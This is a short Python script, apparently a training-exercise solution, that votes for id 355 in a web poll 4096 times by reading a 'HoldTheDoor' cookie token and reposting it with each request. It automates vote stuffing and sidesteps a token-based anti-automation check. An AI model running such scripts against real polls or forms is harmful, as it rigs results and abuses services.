#!/usr/bin/python3
""" this module contains a script to vote for id 355 4096 times """
import requests


for i in range(4096):
    url = 'http://158.69.76.135/level1.php'
    page = requests.get(url)
    pw = page.cookies['HoldTheDoor']
    my_data = {'id': '355', 'holdthedoor': 'Submit', 'key': pw}
    res = requests.post(url, data=my_data, cookies={"HoldTheDoor": pw})
